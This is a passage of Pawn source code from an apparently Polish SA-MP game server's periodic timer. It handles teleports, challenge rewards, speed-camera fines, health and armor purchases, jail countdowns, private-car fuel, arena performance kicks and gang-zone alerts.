	        if(IsPlayerInRangeOfPoint(playerid, 0.8, aX[arrowsid], aY[arrowsid], aZ[arrowsid]) && !GetPlayerVirtualWorld(playerid) && Player[playerid][IsLoggedIn])
	        {
	            if(GetPVarInt(playerid,"TpA") < gettime())
	            {
					if(ReflexType == 8) {
						AddExp(playerid, 40);
						Player[playerid][Cash] += 5000;
						Player[playerid][Czat]++;
  						new kodstr[256];
	  					format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
						SendClientMessageToAll(-1, kodstr);
						ReflexType = -1;
						ReflexActive = false;
						Loop(loopid, MAX_PLAYERS) {
		    				if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
	                SetPVarInt(playerid,"TpA",gettime()+6);
	                SetPlayerPos(playerid, aX2[arrowsid], aY2[arrowsid], aZ2[arrowsid]);
	            }
			}
	        if(IsPlayerInRangeOfPoint(playerid, 0.8, aX2[arrowsid], aY2[arrowsid], aZ2[arrowsid]) && !GetPlayerVirtualWorld(playerid) && Player[playerid][IsLoggedIn])
	        {
	            if(GetPVarInt(playerid,"TpA") < gettime())
	            {
					if(ReflexType == 8) {
						AddExp(playerid, 40);
						Player[playerid][Cash] += 5000;
						Player[playerid][Czat]++;
  						new kodstr[256];
	  					format(kodstr, sizeof(kodstr), "{ff7768}[Reflex] "C_WHITE"%s(%d) {ff7768}wykonuje wyzwanie jako pierwszy!", Player[playerid][Name], playerid);
						SendClientMessageToAll(-1, kodstr);
						ReflexType = -1;
						ReflexActive = false;
						Loop(loopid, MAX_PLAYERS) {
		    				if(IsPlayerConnected(loopid) && TDOn[loopid]) HideReflex(loopid); } }
	                SetPVarInt(playerid,"TpA",gettime()+6);
	                SetPlayerPos(playerid, aX[arrowsid], aY[arrowsid], aZ[arrowsid]);
	            }
			}
		}
 		if(GetPVarInt(playerid,"DataSave") < gettime() && Player[playerid][IsLoggedIn]) {
 		    SaveAllData(playerid);
		 	SetPVarInt(playerid,"DataSave",gettime()+60); }
    Loop(radars, MAX_RADARS) {
      new Float:speed = GetPlayerSpeed(playerid);
      if(IsPlayerInAnyVehicle(playerid) && IsPlayerInRangeOfPoint(playerid, 15.0, radarX[radars], radarY[radars], radarZ[radars]) && !GetPlayerVirtualWorld(playerid) && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER) {
        if(speed > 120 && GetPVarInt(playerid, "RadarCyk") < gettime()) {
          SetPVarInt(playerid,"RadarCyk",gettime()+30);
          PlayerPlaySound(playerid,1132,0.0,0.0,0.0);
          new radarhajstake = 5000;
          new radarexptake = 50;
          if(Player[playerid][Exp] < radarexptake || Player[playerid][Cash] < radarhajstake) {
      		SendClientMessage(playerid, -1, ""C_RED"Zosta³eœ z³apany przez fotoradar, lecz nie straci³eœ EXP i gotówki."); }
          if(Player[playerid][Exp] >= radarexptake && Player[playerid][Cash] >= radarhajstake) {
            new fstr[256];
            format(fstr, sizeof(fstr), ""C_YELLOW"Przekroczy³eœ prêdkoœæ! Tracisz {FF0000}%d EXP"C_YELLOW" i {FF0000}%d$"C_YELLOW".", radarexptake, radarhajstake);
            ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_MSGBOX, ""NAZWA" {1194D6}» "C_YELLOW"Kontrola prêdkoœci", fstr, "Zamknij", "");
            Player[playerid][Exp] -= radarexptake;
            Player[playerid][Cash] -= radarhajstake;
			if(pAch[playerid][14] < 1) {
				pAch[playerid][14] = 1;
                AddExp(playerid, 200);
				Sound(playerid,1137,0.0,0.0,0.0);
				SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Pirat drogowy", "New achievement: "C_NICK"Pirat drogowy"); } }
        }
      }
    }
		if(HPTimer[playerid] == 1) {
		    SetPlayerHealth(playerid, 100.0);
		   	new msgs[256];
		   	if(Player[playerid][Vip] < gettime()) Player[playerid][Cash] -= 500;
		   	HPTimer[playerid] = 0;
		    HPTimering[playerid] = false;
            Sound(playerid, 5202, 0.0, 0.0, 0.0);
   			if(Player[playerid][Vip] < gettime()) format(msgs, sizeof(msgs), ""C_GREEN"Gracz "C_WHITE"%s (%d) "C_GREEN"kupi³ ¿ycie za "C_WHITE"$500"C_GREEN".", Player[playerid][Name], playerid); 
			else format(msgs, sizeof(msgs), ""C_GREEN"Gracz "C_WHITE"%s (%d) "C_GREEN"uzdrowi³ siê.", Player[playerid][Name], playerid);
			SendClientMessageToAll(GREEN, msgs); }
		if(HPTimer[playerid] > 0) HPTimer[playerid] -= 1;
		if(ArmorTimer[playerid] == 1) {
		    SetPlayerArmour(playerid, 100.0);
		   	new msgs[256];
		   	if(Player[playerid][Vip] < gettime()) Player[playerid][Cash] -= 1000;
		   	ArmorTimer[playerid] = 0;
		   	ArmorTimering[playerid] = false;
            Sound(playerid, 5202, 0.0, 0.0, 0.0);
   			if(Player[playerid][Vip] < gettime()) format(msgs, sizeof(msgs), ""C_GREEN"Gracz "C_WHITE"%s (%d) "C_GREEN"kupi³ kamizelkê za "C_WHITE"$1000"C_GREEN".", Player[playerid][Name], playerid); 
			else format(msgs, sizeof(msgs), ""C_GREEN"Gracz "C_WHITE"%s (%d) "C_GREEN"odnowi³ kamizelkê.", Player[playerid][Name], playerid); 
			SendClientMessageToAll(GREEN, msgs); }
		if(ArmorTimer[playerid] > 0) ArmorTimer[playerid] -= 1;
		if(BattleTimer[playerid] > 0) {
			BattleTimer[playerid] -= 1;
			if(BattleTimer[playerid] == 0) SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Nie jesteœ ju¿ w trakcie walki."); }
		if(TPTimer[playerid] > 0) TPTimer[playerid] -= 1;
		if(JailTimeP[playerid] > 0) {
		    JailTimeP[playerid]--;
 			new tdstrr[256];
 			format(tdstrr, sizeof(tdstrr), "~w~Wrocisz na wolnosc za ~r~~h~%s~w~.", TimeConvert(JailTimeP[playerid]));
			PlayerTextDrawSetString(playerid, JailTime[playerid], tdstrr); }
		if(JailTimeP[playerid] == 1) SetTimerEx("Unjail", 1000, 0, "i", playerid);
		new cgameid;
		cgameid = OnGame[playerid];
		if(OnGame[playerid] != -1 && GetPlayerVirtualWorld(playerid) && !Wystartowala[cgameid]) WypiszZabawa(playerid);
		if(OnGame[playerid] == RC && Wystartowala[RC] && RCTimer == 0 && !IsPlayerInAnyVehicle(playerid)) WypiszZabawa(playerid);
		if(pPing[playerid] < 140 && pFPS[playerid] > 30 && ArenaWarn[playerid] > 0) ArenaWarn[playerid]--;
		if(CarTimer[playerid] > 0) CarTimer[playerid]--;
		if(CatchingPokemon[playerid] > -1) PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
		if(IsPlayerInRangeOfPoint(playerid, 120.0,-1382.7828,-2259.3782,37.5516) && GetPlayerWeapon(playerid) == 6 && !GBarOn[playerid]) {
		    GBarOn[playerid] = true;
		    ShowProgressBarForPlayer(playerid, GornictwoBar[playerid]);
		    UpdateGornictwo(playerid); }
		if(!IsPlayerInRangeOfPoint(playerid, 120.0,-1382.7828,-2259.3782,37.5516) || GetPlayerWeapon(playerid) != 6 && GBarOn[playerid]) {
		    GBarOn[playerid] = false;
		    HideProgressBarForPlayer(playerid, GornictwoBar[playerid]); }
		if(Countdown[playerid] == 1)
		{
 			Countdown[playerid]--;
		   	PlayerPlaySound(playerid, 1057, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, "~g~~h~START!", 1000, 3);
		}
		if(TPP[playerid] > 0) TPP[playerid]--;
	    if(AFK[playerid])
	    {
			if(OnGame[playerid] != -1) {
			    new cgameeid = OnGame[playerid];
			    if(!Wystartowala[cgameeid]) WypiszZabawa(playerid); }
			if(pFight[playerid])
			{
	    		Loop(loopid, MAX_PLAYERS)
	    		{
	        		if(pEnemy[loopid] == playerid)
	        		{
	   					SetPlayerInterior(loopid, 0);
	   					SetPlayerVirtualWorld(playerid, 0);
	   					SetPlayerVirtualWorld(loopid, 0);
	    				pFight[loopid] = false;
	    				pFight[playerid] = false;
	    				AddExp(loopid, 30);
	    				Player[playerid][Exp] -= 10;
	    				if(Player[playerid][Exp] < 0) Player[playerid][Exp] = 0;
	    				Player[loopid][Solo]++;
	    				new solomsg[256];
	    				format(solomsg, sizeof(solomsg), ""C_NICK"%s(%d) {CCFF33}wygrywa pojedynek solo z "C_NICK"%s(%d){CCFF33}!", Player[loopid][Name], loopid, Player[playerid][Name], playerid);
						SendClientMessageToAll(-1, solomsg);
						SpawnFunction(loopid);
						SpawnFunction(playerid);
	        		}
				}
			}
			return 1;
		}
		Loop(privcarid, privcars)
		{
			if(IsPlayerInVehicle(playerid, ppVeh[privcarid]) && pOwner[privcarid] == Player[playerid][ID] && AFKPoints[playerid] > 0)
			{
				new Float:speed = GetPlayerSpeed(playerid);
				if(speed > 10 && speed < 40) pDist[privcarid] += 0.02;
				if(speed > 39 && speed < 100) pDist[privcarid] += 0.04;
				if(speed > 100 && speed < 220) pDist[privcarid] += 0.05;
				if(speed > 220 && speed < 290) pDist[privcarid] += 0.1;
				if(speed > 0 && pFuelT[privcarid] == 0) pFuel[privcarid] -= 0.005;
				if(speed > 15 && pFuelT[privcarid] == 1) pFuel[privcarid] -= 0.003;
				if(speed > 0 && pFuelT[privcarid] == 2) pFuel[privcarid] -= 0.003;
 				if(speed > 100 && pFuelT[privcarid] == 3) pFuel[privcarid] -= 0.001;
				new tdstr[256];
				if(pFuelT[privcarid] == 0) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(95, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
				if(pFuelT[privcarid] == 1) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(98, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
				if(pFuelT[privcarid] == 2) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(ON, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
				if(pFuelT[privcarid] == 3) format(tdstr,sizeof(tdstr), "{CD82F5}%s, {65D2A9}%d\n{FFFF00}%.1fL {CD82F5}(LPG, U%d)\n"C_NICK"%.1fkm", pOwnerN[privcarid], privcarid, pFuel[privcarid], pUpgrade[privcarid], pDist[privcarid]);
				Update3DTextLabelText(pText[privcarid], -1, tdstr);
			}
		}
		if(Countdown[playerid] > 1) {
		    Countdown[playerid]--;
			new cstr[128];
			if(Countdown[playerid] > 10) format(cstr, sizeof(cstr), "~y~~h~%d", Countdown[playerid]);
			if(Countdown[playerid] < 11 && Countdown[playerid] > 3) format(cstr, sizeof(cstr), "~g~~h~%d", Countdown[playerid]);
			if(Countdown[playerid] < 4)
			{
				format(cstr, sizeof(cstr), "~r~~h~%d", Countdown[playerid]);
				PlayerPlaySound(playerid, 1056, 0.0, 0.0, 0.0);
			}
			GameTextForPlayer(playerid, cstr, 1000, 3);
		}
		if(AntySpam[playerid] > 0) AntySpam[playerid]--;
 		if(zwBlock[playerid] > 0) zwBlock[playerid]--;
 		if(NaNurku[playerid]) ZbierzPaczke(playerid);
		new Float:pl;
		GetPlayerPacketloss(playerid,pl);
		if(pPing[playerid] > 140 || pl > 7 || pFPS[playerid] < 30 && pArena[playerid] > 0) {
		    ArenaWarn[playerid]++;
			if(pArena[playerid] > 0 && ArenaWarn[playerid] >= 3) {
			    ArenaWarn[playerid] = 0;
			    SendClientMessageEx(playerid, RED, "Zosta³eœ wyrzucony z areny za nisk¹ wydajnoœæ.", "You are removed from arena for low performance.");
			    new lstr[256], lstren[256];
			    if(pPing[playerid] > 120) {
					format(lstr, sizeof(lstr), "{FF0000}Ping za du¿y o "C_WHITE"%d{FF0000}ms.", pPing[playerid] - 140);
					format(lstren, sizeof(lstren), "{FF0000}Ping too high by "C_WHITE"%d{FF0000}ms.", pPing[playerid] - 140);
					SendClientMessageEx(playerid, RED, lstr, lstren); }
			    if(pl > 7) {
					format(lstr, sizeof(lstr), "{FF0000}PacketLoss za du¿y o "C_WHITE"%.2f{FF0000}.", pl - 7);
					format(lstren, sizeof(lstren), "{FF0000}PacketLoss too high by "C_WHITE"%.2f{FF0000}.", pl - 7);
					SendClientMessageEx(playerid, RED, lstr, lstren); }
			    if(pFPS[playerid] < 30) {
					format(lstr, sizeof(lstr), "{FF0000}FPS za ma³y o "C_WHITE"%d{FF0000}.", 30 - pFPS[playerid]);
					format(lstren, sizeof(lstren), "{FF0000}FPS too low by "C_WHITE"%d{FF0000}.", 30 - pFPS[playerid]);
					SendClientMessageEx(playerid, RED, lstr, lstren); }
				RemoveFromArena(playerid);
  				SetPlayerHealth(playerid, 100.0);
				SetPlayerArmour(playerid, 100.0);
				pArena[playerid] = 0;
				SetPlayerInterior(playerid, 0);
				SpawnFunction(playerid);
				RefreshAreny(); } }
/*	 	if(Player[playerid][Admin] < 1 && Player[playerid][Vip] < gettime()) format(licznikconn,sizeof(licznikconn), ""C_WHITE"FPS: {FF3F2D}%d "C_WHITE"| Ping: {FF3F2D}%d "C_WHITE"| PL: {FF3F2D}%.2f", pFPS[playerid], pPing[playerid], pl);
	 	if(Player[playerid][Vip] > gettime()) format(licznikconn,sizeof(licznikconn), ""C_YELLOW"VIP\n"C_WHITE"FPS: {FF3F2D}%d "C_WHITE"| Ping: {FF3F2D}%d "C_WHITE"| PL: {FF3F2D}%.2f", pFPS[playerid], pPing[playerid], pl);
	 	if(Player[playerid][Admin] == 1) format(licznikconn,sizeof(licznikconn), ""JUNIOR"\n"C_WHITE"FPS: {FF3F2D}%d "C_WHITE"| Ping: {FF3F2D}%d "C_WHITE"| PL: {FF3F2D}%.2f", pFPS[playerid], pPing[playerid], pl);
	 	if(Player[playerid][Admin] == 2) format(licznikconn,sizeof(licznikconn), ""ADMIN"\n"C_WHITE"FPS: {FF3F2D}%d "C_WHITE"| Ping: {FF3F2D}%d "C_WHITE"| PL: {FF3F2D}%.2f", pFPS[playerid], pPing[playerid], pl);
	 	if(Player[playerid][Admin] == 3) format(licznikconn,sizeof(licznikconn), ""VHA"\n"C_WHITE"FPS: {FF3F2D}%d "C_WHITE"| Ping: {FF3F2D}%d "C_WHITE"| PL: {FF3F2D}%.2f", pFPS[playerid], pPing[playerid], pl);
	 	if(Player[playerid][Admin] == 4) format(licznikconn,sizeof(licznikconn), ""HA"\n"C_WHITE"FPS: {FF3F2D}%d "C_WHITE"| Ping: {FF3F2D}%d "C_WHITE"| PL: {FF3F2D}%.2f", pFPS[playerid], pPing[playerid], pl);
	 	if(AFKPoints[playerid] < 1 || AFK[playerid]) format(licznikconn,sizeof(licznikconn), "{FF0000}AFK");
		Update3DTextLabelText(pLabel[playerid], -1, licznikconn);*/
		Loop(gangid, MAX_GANGS)
		{
			if(IsPlayerInArea(playerid, gMinX[gangid], gMinY[gangid], gMaxX[gangid], gMaxY[gangid]) && ClanTimer[playerid] == 0 && Player[playerid][Gang] != gangid)
			{
			    ClanTimer[playerid] = 30;
			    Loop(loopid, MAX_PLAYERS)
			    {
			        if(Player[loopid][Gang] == gangid && Player[loopid][Gang] != -1)
			        {
			            SendClientMessage(loopid, -1, "{919191}*  Obcy gracz przebywa na terenie klanu.");
			        }
			    }
			}
		}
		if(ClanTimer[playerid] > 0) ClanTimer[playerid]--;
	}
	PrivcarHandling();
	Loop(zone, gangzones) CheckZone(zone);
	Loop(playerid, MAX_PLAYERS) { if(IsPlayerConnected(playerid)) CheckSolo(playerid); }
	Loop(zabawa, MAX_GAMES) {
		if(ZTimer[zabawa] > 0) {
			ZTimer[zabawa]--;
			if(ZTimer[zabawa] == 0) {
				TextDrawHideForAll(Textdraw[20]);
				TextDrawHideForAll(Textdraw[21]);
				TextDrawHideForAll(Textdraw[22]); }
			RefreshZabawy(); } }
	CheckNapady();
	NapadTDref();
	return 1;
}
